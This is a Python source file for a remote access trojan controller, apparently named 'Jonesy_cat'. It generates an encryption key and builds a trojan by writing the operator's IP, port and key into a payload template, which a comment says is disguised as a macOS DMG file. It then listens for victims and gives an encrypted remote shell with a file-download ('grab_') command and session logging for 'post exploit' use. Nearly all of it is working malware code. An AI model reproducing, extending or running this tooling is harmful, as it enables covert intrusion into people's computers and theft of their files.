import datetime
import os
import pickle
import socket
import struct
import sys


from cryptography.fernet import Fernet

#### text colours
'text colour codes:'
'red'
CRED = '\033[91m'
'end'
CEND = '\033[0m'
'blue'
CBLU = '\33[96m'
'magenta'
CMAN = '\33[95m'
'yellow'
CYEL = '\33[33m'
'backg'
CGREY = '\33[44m'


'#### - SYMMETRIC ENCRYPTION - ####'
# Generate Key:
# - Each time a connection is compromised you should generate a new key for exploits
def generate_key():
    key = Fernet.generate_key()
    with open("Jonesy_cat.key", "wb") as key_file:
         key_file.write(key)
    print("New key is saved in 'Jonesy_cat.key' file.")
    print(CYEL + "'" + key.decode() + "'" + CEND)
    menu()

'# Read Key:'
# - read key from file
def read_key():
    return open("Jonesy_cat.key", "rb").read()


'# Encrypt message:'
# - read key and encrypt
def encrypt_mess(comm):
    'encode message'
    key = read_key()
    encoded_message = comm.encode()
    'use key to encrypt'
    f = Fernet(key)
    encrypted = f.encrypt(encoded_message)
    return encrypted

'# Decrypt data'
def decrypt_mess(message):
    key = read_key()
    f = Fernet(key)
    decrypted_mess = f.decrypt(message)
    return decrypted_mess

'#read executable code file'
def read_code():
    return open("exec_example.py", "rb").read()

'#### - GENERAL FUNCTIONS - ####'
def banner():
    print("")
    print("")
    print("     ____._______                                 _________         __   ")
    print("    |    |\\   _  \\   ____   ______ ____ ___.__.   \\_   ___ \\_____ _/  |_ ")
    print("    |    |/  /_\\  \\ /    \\ /  ___// __ <   |  |   /    \\  \\/\\__  \\\\   __\\ ")
    print("/\\__|    |\\  \\_/   \\   |  \\___ \\ \\  ___/\\___  |   \\     \\____/ __ \\|  |  ")
    print("\\________| \\_____  /___|  /____  >\\___  > ____|____\\______  (____  /__|  ")
    print("                 \\/     \\/     \\/     \\/\\/   /_____/      \\/     \\/      ")
    print("----------------------------created by Ford Larman-----------------------")
    menu()

'# Menu'
def menu():
    print("\n")
    print("---Menu---")
    print("1." + CYEL + " Generate Encryption Key" + CEND)
    print("2." + CYEL + " Create Trojan Executable" + CEND)
    print("3." + CYEL + " Connect to Target" + CEND)
    print("type 'exit' to exit")
    select = input(">>>: ")
    if select == "3":
        find_Server()
    elif select == "2":
        create_rat()
    elif select == "1":
        generate_key()
    elif select == "exit":
        print(CRED + "[!] Shutting Down" + CEND)
        sys.exit()
    else:
        print(CRED + "[!] Bad Input" + CEND)


'# Connect to Server'
def find_Server():
    'initialise socket'
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print("\n")
    print(">>> Connecting to Target")

    '#### Enter you local IP and port ####'
    ip = input("Enter IP: ")
    port = input("Enter Port number: ")
    ss.bind((ip, int(port)))
    print(CBLU + "[+] Server On" + CEND)
    ss.listen(5)
    print(CBLU + "[+] LISTENING..." + CEND)
    (clientsocket, address) = ss.accept()
    print(CBLU + "[+] Target CONNECTED!" + CEND)
    print(CBLU + "[+] @ " + str(address) + CEND)
    backdoor(clientsocket, ss)

###NEEDS WORK TO BE SOMETHING LEGITIMATE###
# Make executable file a MacOS specific file. Not python file.
'# Create rat file'
def create_rat():
    print(CBLU + "\n[+] Creating RAT Executable" + CEND)
    print("Please Enter Your designated machine details.")
    ip = input(">>> IP address: ")
    port = input(">>> Destination port : ")
    name = input("enter file name: ")
    full_name = name + ".py"
    current_key = read_key()
    code = read_code()
    with open(full_name, "wb") as f:
        f.write(code)
    # read the new file lines
    with open(full_name, "r") as f:
       get_all = f.readlines()
    # write inputs to new file.
    with open(full_name, "w") as f:
        for i, line in enumerate(get_all, 1):
            if i == 14:
                f.writelines("    key = " + str(current_key) + "\n")
            elif i == 58:
                f.writelines("        ip =" + "'" + ip + "'" + "\n")
            elif i == 59:
                f.writelines("        port = " + port + "\n")
            else:
                f.writelines(line)
    print(CBLU + "[+] Writing Executable..." + CEND)
    # disguise socket as executable
    make_dmg_file(name)
    print(CBLU + "[+] Executable " + name + " created" + CEND)
    menu()

'convert python file to executable'
def make_dmg_file(name):
    'take generated python file and call dmgbuild'
    os.system("sh build_script.sh")
    #os.system("rm "+ name + ".py")
    return

'screen shot function'
# handle image as packets
def download_file(conn):
    data_size = struct.unpack('>I', conn.recv(4))[0]
    received_payload = b""
    remaining_payload_size = int(data_size)
    while remaining_payload_size > 0:
        received_payload += conn.recv(remaining_payload_size)
        remaining_payload_size = data_size - len(received_payload)
    data = pickle.loads(received_payload)
    return data

'#### - BACKDOOR FUNCTIONS - ####'
# Communicate via backdoor
#### Needs a file write function to maintain log activity for post exploit reference
def backdoor(client, ss):
    print("\n")
    date = datetime.datetime.now()
    logName = str(date) + ".txt"
    with open(logName, "w") as f:
        f.writelines("JC--LOG FILE: " + str(date) + "\n")
        f.close()
    while True:
        shell = input(CRED + "Shell>>>" + CEND)
        if shell == "exit":
            print(CBLU + "[+] Closing connection!\n" + CEND)
            client.close()
            ss.close()
            with open(logName, "a") as f:
                f.writelines("***Transmission Ended***")
                f.close()
            menu()
        elif shell == "help":
            print("\n#################################################")
            print("You've entered the targets computer..")
            print("You have a few options: ")
            print("'exit'  - to close connection")
            print("'grab_<filename>' - allows you to download a specific file")
            print("\nOtherwise all directory commands remain the same.")
            print("Goodluck!")
            print("- JC\n")
            print("###################################################\n")
        elif "grab_" in shell:
              message = encrypt_mess(shell)
              client.sendall(message)
              file_name = shell.replace("grab_", "")
              data = download_file(client)
              # save bytes to file format
              f = open(file_name, "wb")
              f.write(data)
              f.close()
              print("\n You grabbed " + file_name + "!\n")
        else:
            message = encrypt_mess(shell)
            #print(message)
            #needs error checking here
            client.sendall(message)
            #receive data
            data = client.recv(4096)

            #decrypt data
            rcv_message = decrypt_mess(data)
            #print message decoded
            print(CYEL + rcv_message.decode() + CEND)
            #Log file
            with open(logName, "a") as f:
                f.writelines("Shell>>>" + shell + "\n")
                f.writelines(rcv_message.decode())
                f.writelines("\n")
                f.close()


banner()